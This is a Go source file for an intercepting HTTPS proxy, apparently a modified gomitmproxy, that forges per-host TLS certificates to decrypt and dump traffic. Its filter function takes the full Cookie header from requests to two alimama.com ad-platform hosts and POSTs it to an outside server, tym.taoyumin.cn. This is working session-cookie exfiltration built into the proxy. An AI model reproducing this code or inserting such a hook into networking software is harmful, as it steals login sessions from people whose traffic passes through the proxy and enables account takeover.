package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

type HandlerWrapper struct {
	MyConfig        *Cfg
	tlsConfig       *TlsConfig
	wrapped         http.Handler
	pk              *PrivateKey
	pkPem           []byte
	issuingCert     *Certificate
	issuingCertPem  []byte
	serverTLSConfig *tls.Config
	dynamicCerts    *Cache
	certMutex       sync.Mutex
	https           bool

	client *http.Client
}

func (hw *HandlerWrapper) GenerateCertForClient() (err error) {
	if hw.tlsConfig.Organization == "" {
		hw.tlsConfig.Organization = "gomitmproxy" + Version
	}
	if hw.tlsConfig.CommonName == "" {
		hw.tlsConfig.CommonName = "gomitmproxy"
	}
	if hw.pk, err = LoadPKFromFile(hw.tlsConfig.PrivateKeyFile); err != nil {
		hw.pk, err = GeneratePK(2048)
		if err != nil {
			return fmt.Errorf("Unable to generate private key: %s", err)
		}
		hw.pk.WriteToFile(hw.tlsConfig.PrivateKeyFile)
	}
	hw.pkPem = hw.pk.PEMEncoded()
	hw.issuingCert, err = LoadCertificateFromFile(hw.tlsConfig.CertFile)
	if err != nil || hw.issuingCert.ExpiresBefore(time.Now().AddDate(0, ONE_MONTH, 0)) {
		hw.issuingCert, err = hw.pk.TLSCertificateFor(
			hw.tlsConfig.Organization,
			hw.tlsConfig.CommonName,
			time.Now().AddDate(ONE_YEAR, 0, 0),
			true,
			nil)
		if err != nil {
			return fmt.Errorf("Unable to generate self-signed issuing certificate: %s", err)
		}
		hw.issuingCert.WriteToFile(hw.tlsConfig.CertFile)
	}
	hw.issuingCertPem = hw.issuingCert.PEMEncoded()
	return
}

func (hw *HandlerWrapper) FakeCertForName(name string) (cert *tls.Certificate, err error) {
	kpCandidateIf, found := hw.dynamicCerts.Get(name)
	if found {
		return kpCandidateIf.(*tls.Certificate), nil
	}

	hw.certMutex.Lock()
	defer hw.certMutex.Unlock()
	kpCandidateIf, found = hw.dynamicCerts.Get(name)
	if found {
		return kpCandidateIf.(*tls.Certificate), nil
	}

	//create certificate
	certTTL := TWO_WEEKS
	generatedCert, err := hw.pk.TLSCertificateFor(
		hw.tlsConfig.Organization,
		name,
		time.Now().Add(certTTL),
		false,
		hw.issuingCert)
	if err != nil {
		return nil, fmt.Errorf("Unable to issue certificate: %s", err)
	}
	keyPair, err := tls.X509KeyPair(generatedCert.PEMEncoded(), hw.pkPem)
	if err != nil {
		return nil, fmt.Errorf("Unable to parse keypair for tls: %s", err)
	}

	cacheTTL := certTTL - ONE_DAY
	hw.dynamicCerts.Set(name, &keyPair, cacheTTL)
	return &keyPair, nil
}

func (hw *HandlerWrapper) DumpHTTPAndHTTPs(resp http.ResponseWriter, req *http.Request) {
	req.Header.Del("Proxy-Connection")
	req.Header.Set("Connection", "Keep-Alive")

	var reqDump []byte
	var err error
	ch := make(chan bool)
	// handle connection
	go func() {
		reqDump, err = httputil.DumpRequestOut(req, true)
		ch <- true
	}()
	if err != nil {
		logger.Println("DumpRequest error ", err)
	}
	connIn, _, err := resp.(http.Hijacker).Hijack()
	if err != nil {
		logger.Println("hijack error:", err)
	}
	defer connIn.Close()

	var respOut *http.Response
	host := req.Host

	matched, _ := regexp.MatchString(":[0-9]+$", host)

	if !hw.https {
		if !matched {
			host += ":80"
		}

		connOut, err := net.DialTimeout("tcp", host, time.Second*30)
		if err != nil {
			logger.Println("dial to", host, "error:", err)
			return
		}

		if err = req.Write(connOut); err != nil {
			logger.Println("send to server error", err)
			return
		}

		respOut, err = http.ReadResponse(bufio.NewReader(connOut), req)
		if err != nil && err != io.EOF {
			logger.Println("read response error:", err)
		}

	} else {
		if !matched {
			host += ":443"
		}

		connOut, err := tls.Dial("tcp", host, hw.tlsConfig.ServerTLSConfig)

		if err != nil {
			logger.Panicln("tls dial to", host, "error:", err)
			return
		}
		if err = req.Write(connOut); err != nil {
			logger.Println("send to server error", err)
			return
		}

		respOut, err = http.ReadResponse(bufio.NewReader(connOut), req)
		if err != nil && err != io.EOF {
			logger.Println("read response error:", err)
		}

	}

	if respOut == nil {
		log.Println("respOut is nil")
		return
	}

	respDump, err := httputil.DumpResponse(respOut, true)
	if err != nil {
		logger.Println("respDump error:", err)
	}

	_, err = connIn.Write(respDump)
	if err != nil {
		logger.Println("connIn write error:", err)
	}
	
	hw.filter(respOut, req)

	if *hw.MyConfig.Monitor {
		<-ch
		go httpDump(reqDump, respOut)
	} else {
		<-ch
	}

}

type RealTbkSetCookieReq struct {
	Cookies  string `json:"cookies"`
	TbToken  string `json:"tbToken,omitempty"`
	Siteid   string `json:"Siteid,omitempty"`
	Adzoneid string `json:"Adzoneid,omitempty"`
}
type RealTbkSetCookieRsp struct {
	State int    `json:"state"`
	Msg   string `json:"msg"`
}
type ServerReturnRsp struct {
	OK bool `json:"ok"`
}
func (hw *HandlerWrapper) filter(resp *http.Response, req *http.Request) {
	//if strings.Contains(req.RequestURI, "pub.alimama.com/common/code/getAuctionCode.json") {
	if strings.Contains(req.RequestURI, "pub.alimama.com") || strings.Contains(req.RequestURI, "afpeng.alimama.com") {
		//servRspBody, err := ioutil.ReadAll(resp.Body)
		//if err != nil {
		//	log.Println("server response read body error:", err)
		//	return
		//}
		//var srvRsp ServerReturnRsp
		//err = json.Unmarshal(servRspBody, &srvRsp)
		//if err != nil {
		//	log.Println("response body:", string(servRspBody))
		//	log.Println("Unmarshal server return http response error:", err)
		//	return
		//}
		//if !srvRsp.OK {
		//	fmt.Println("server return not ok. body:", string(servRspBody), time.Now().String())
		//	return
		//}
		
		//req.ParseForm()
		//fmt.Println(req.Form.Get("_tb_token_"))
		//fmt.Println(req.Form.Get("adzoneid"))
		//fmt.Println(req.Form.Get("siteid"))
		//fmt.Println(strings.Join(req.Header["Cookie"], ";"))
		u := "http://tym.taoyumin.cn/index.php?r=search/setdata"
		request := &RealTbkSetCookieReq{
			Cookies:  strings.Join(req.Header["Cookie"], ";"),
			//TbToken:  req.Form.Get("_tb_token_"),
			//Siteid:   req.Form.Get("siteid"),
			//Adzoneid: req.Form.Get("adzoneid"),
		}
		body, err := json.Marshal(request)
		if err != nil {
			log.Println("Marshal error:", err)
			return
		}
		httpReq, err := http.NewRequest("POST", u, strings.NewReader(string(body)))
		if err != nil {
			log.Println("new http request error:", err)
			return
		}
		httpReq.Header.Set("Content-Type", "application/json")

		rsp, err := hw.client.Do(httpReq)
		defer func() {
			if rsp != nil {
				rsp.Body.Close()
			}
		}()
		if err != nil {
			log.Println("do http request error:", err)
			return
		}
		rspBody, err := ioutil.ReadAll(rsp.Body)
		if err != nil {
			log.Println("response read body error:", err)
			return
		}
		//fmt.Println("response body:", string(rspBody))

		var response RealTbkSetCookieRsp
		err = json.Unmarshal(rspBody, &response)
		if err != nil {
			log.Println("response body:", string(rspBody))
			log.Println("Unmarshal http response error:", err)
			return
		}
		if response.State == 1000 {
			fmt.Println("set cookies success. cookie: ", strings.Join(req.Header["Cookie"], ";"), time.Now().String())
			return
		} else {
			fmt.Println(response.State, "error msg:", response.Msg, time.Now().String())
		}
	}
}

func (hw *HandlerWrapper) ServeHTTP(resp http.ResponseWriter, req *http.Request) {

	raddr := *hw.MyConfig.Raddr
	if len(raddr) != 0 {
		hw.Forward(resp, req, raddr)
	} else {
		if req.Method == "CONNECT" {
			hw.https = true
			hw.InterceptHTTPs(resp, req)
		} else {
			hw.https = false
			hw.DumpHTTPAndHTTPs(resp, req)
		}
	}
}

func (hw *HandlerWrapper) InterceptHTTPs(resp http.ResponseWriter, req *http.Request) {
	addr := req.Host
	host := strings.Split(addr, ":")[0]

	cert, err := hw.FakeCertForName(host)
	if err != nil {
		msg := fmt.Sprintf("Could not get mitm cert for name: %s\nerror: %s", host, err)
		respBadGateway(resp, msg)
		return
	}

	// handle connection
	connIn, _, err := resp.(http.Hijacker).Hijack()
	if err != nil {
		msg := fmt.Sprintf("Unable to access underlying connection from client: %s", err)
		respBadGateway(resp, msg)
		return
	}
	tlsConfig := copyTlsConfig(hw.tlsConfig.ServerTLSConfig)
	tlsConfig.Certificates = []tls.Certificate{*cert}
	tlsConnIn := tls.Server(connIn, tlsConfig)
	listener := &mitmListener{tlsConnIn}
	handler := http.HandlerFunc(func(resp2 http.ResponseWriter, req2 *http.Request) {
		req2.URL.Scheme = "https"
		req2.URL.Host = req2.Host
		hw.DumpHTTPAndHTTPs(resp2, req2)

	})

	go func() {
		err = http.Serve(listener, handler)
		if err != nil && err != io.EOF {
			logger.Printf("Error serving mitm'ed connection: %s", err)
		}
	}()

	connIn.Write([]byte("HTTP/1.1 200 OK\r\n\r\n"))
}

func (hw *HandlerWrapper) Forward(resp http.ResponseWriter, req *http.Request, raddr string) {
	connIn, _, err := resp.(http.Hijacker).Hijack()
	connOut, err := net.Dial("tcp", raddr)
	if err != nil {
		logger.Println("dial tcp error", err)
	}

	err = connectProxyServer(connOut, raddr)
	if err != nil {
		logger.Println("connectProxyServer error:", err)
	}

	if req.Method == "CONNECT" {
		b := []byte("HTTP/1.1 200 Connection Established\r\n" +
			"Proxy-Agent: gomitmproxy/" + Version + "\r\n\r\n")
		_, err := connIn.Write(b)
		if err != nil {
			logger.Println("Write Connect err:", err)
			return
		}
	} else {
		req.Header.Del("Proxy-Connection")
		req.Header.Set("Connection", "Keep-Alive")
		if err = req.Write(connOut); err != nil {
			logger.Println("send to server err", err)
			return
		}
	}
	err = Transport(connIn, connOut)
	if err != nil {
		log.Println("trans error ", err)
	}
}

func InitConfig(conf *Cfg, tlsConfig *TlsConfig) (*HandlerWrapper, error) {
	hw := &HandlerWrapper{
		MyConfig:     conf,
		tlsConfig:    tlsConfig,
		dynamicCerts: NewCache(),
		client:       &http.Client{},
	}
	err := hw.GenerateCertForClient()
	if err != nil {
		return nil, err
	}
	return hw, nil
}

func copyTlsConfig(template *tls.Config) *tls.Config {
	tlsConfig := &tls.Config{}
	if template != nil {
		*tlsConfig = *template
	}
	return tlsConfig
}

func respBadGateway(resp http.ResponseWriter, msg string) {
	log.Println(msg)
	resp.WriteHeader(502)
	resp.Write([]byte(msg))
}

//两个io口的连接
func Transport(conn1, conn2 net.Conn) (err error) {
	rChan := make(chan error, 1)
	wChan := make(chan error, 1)

	go MyCopy(conn1, conn2, wChan)
	go MyCopy(conn2, conn1, rChan)

	select {
	case err = <-wChan:
	case err = <-rChan:
	}

	return
}

func MyCopy(src io.Reader, dst io.Writer, ch chan<- error) {
	_, err := io.Copy(dst, src)
	ch <- err
}

func connectProxyServer(conn net.Conn, addr string) error {

	req := &http.Request{
		Method:     "CONNECT",
		URL:        &url.URL{Host: addr},
		Host:       addr,
		ProtoMajor: 1,
		ProtoMinor: 1,
		Header:     make(http.Header),
	}
	req.Header.Set("Proxy-Connection", "keep-alive")

	if err := req.Write(conn); err != nil {
		return err
	}

	resp, err := http.ReadResponse(bufio.NewReader(conn), req)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return errors.New(resp.Status)
	}
	return nil
}

/*func ReadNotDrain(r *http.Request) (content []byte, err error) {
	content, err = ioutil.ReadAll(r.Body)
	r.Body = io.ReadCloser(bytes.NewBuffer(content))
	return
}

func ParsePostValues(req *http.Request) (url.Values, error) {
	c, err := ReadNotDrain(req)
	if err != nil {
		return nil, err
	}
	values, err := url.ParseQuery(string(c))
	if err != nil {
		return nil, err
	}
	return values, nil
}
*/
